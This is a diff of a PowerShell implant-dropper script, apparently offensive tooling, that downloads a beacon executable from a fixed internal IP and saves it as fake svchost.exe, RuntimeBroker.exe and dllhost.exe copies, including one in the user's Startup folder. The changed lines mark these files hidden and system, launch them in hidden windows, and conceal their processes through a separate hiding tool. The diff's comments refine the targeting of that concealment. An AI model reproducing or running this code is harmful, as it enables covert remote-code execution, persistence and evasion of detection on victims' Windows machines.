@@ -117,28 +117,30 @@ $Beacon2 = "$BeaconDir\RuntimeBroker.exe"
 $StartupDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $Beacon3 = "$StartupDir\dllhost.exe"
 
-$BeaconsToDrop = @(
-    @{ Path = $Beacon1; Url = "http://10.2.0.144/svchost.exe" },
-    @{ Path = $Beacon2; Url = "http://10.2.0.144/RuntimeBroker.exe" },
-    @{ Path = $Beacon3; Url = "http://10.2.0.144/dllhost.exe" }
-)
+Write-Host "    -> Downloading primary beacon..."
+if (-not (Test-Path $Beacon1)) {
+    Invoke-WebRequest -Uri "http://10.2.0.144/svchost.exe" -OutFile $Beacon1 -UseBasicParsing -ErrorAction SilentlyContinue
+    Unblock-File -Path $Beacon1 -ErrorAction SilentlyContinue
+}
 
-Write-Host "    -> Downloading beacons..."
-foreach ($b in $BeaconsToDrop) {
-    if (-not (Test-Path $b.Path)) {
-        Write-Host "        -> Pulling $($b.Path)..."
-        Invoke-WebRequest -Uri $b.Url -OutFile $b.Path -UseBasicParsing -ErrorAction SilentlyContinue
-        Unblock-File -Path $b.Path -ErrorAction SilentlyContinue
-        Set-ItemProperty -Path $b.Path -Name Attributes -Value "Hidden, System" -ErrorAction SilentlyContinue
+Write-Host "    -> Copying beacons for redundancy..."
+if ((Test-Path $Beacon1) -and -not (Test-Path $Beacon2)) { Copy-Item $Beacon1 -Destination $Beacon2 -Force }
+if ((Test-Path $Beacon1) -and -not (Test-Path $Beacon3)) { Copy-Item $Beacon1 -Destination $Beacon3 -Force }
+
+$AllBeacons = @($Beacon1, $Beacon2, $Beacon3)
+
+foreach ($b in $AllBeacons) {
+    if (Test-Path $b) {
+        Set-ItemProperty -Path $b -Name Attributes -Value "Hidden, System" -ErrorAction SilentlyContinue
     }
 }
 
 Write-Host "    -> Starting Beacons silently..."
-foreach ($b in $BeaconsToDrop) {
+foreach ($b in $AllBeacons) {
     # Using .NET GetFileNameWithoutExtension because Split-Path -LeafBase is only available in PowerShell Core (6.0+)
-    $processCheck = Get-Process -Name ([System.IO.Path]::GetFileNameWithoutExtension($b.Path)) -ErrorAction SilentlyContinue | Where-Object {$_.Path -eq $b.Path}
-    if (-not $processCheck -and (Test-Path $b.Path)) {
-        Start-Process -FilePath $b.Path -WindowStyle Hidden -ErrorAction SilentlyContinue
+    $processCheck = Get-Process -Name ([System.IO.Path]::GetFileNameWithoutExtension($b)) -ErrorAction SilentlyContinue | Where-Object {$_.Path -eq $b}
+    if (-not $processCheck -and (Test-Path $b)) {
+        Start-Process -FilePath $b -WindowStyle Hidden -ErrorAction SilentlyContinue
     }
 }
 Start-Sleep -Seconds 3
@@ -215,7 +217,8 @@ foreach ($Port in $PortsToHide) {
 
 foreach ($ProcName in $ProcessesToHide) {
     Write-Host "[*] Attempting to find and hide process: $ProcName..."
-    $targetProcs = Get-Process -Name $ProcName -ErrorAction SilentlyContinue
+    # Crucial Fix: Only hide the beacons we dropped in USOShared, NOT the 80 legitimate Windows processes!
+    $targetProcs = Get-Process -Name $ProcName -ErrorAction SilentlyContinue | Where-Object {$_.Path -like "*USOShared*"}
     if ($targetProcs) {
         foreach ($p in $targetProcs) {
             Write-Host "    -> Hiding PID: $($p.Id)"
@@ -247,7 +250,8 @@ cd "$PersistDir"
 
 `$hideprocs = @("svchost", "RuntimeBroker")
 foreach (`$proc in `$hideprocs) {
-    `$procs = Get-Process -Name `$proc -ErrorAction SilentlyContinue
+    # Crucial Fix: Only hide the beacons we dropped in USOShared, NOT the 80 legitimate Windows processes!
+    `$procs = Get-Process -Name `$proc -ErrorAction SilentlyContinue | Where-Object {`$_.Path -like "*USOShared*"}
     if (`$procs) {
         foreach (`$p in `$procs) {
             .\svchost_net.exe hide-pid `$p.Id
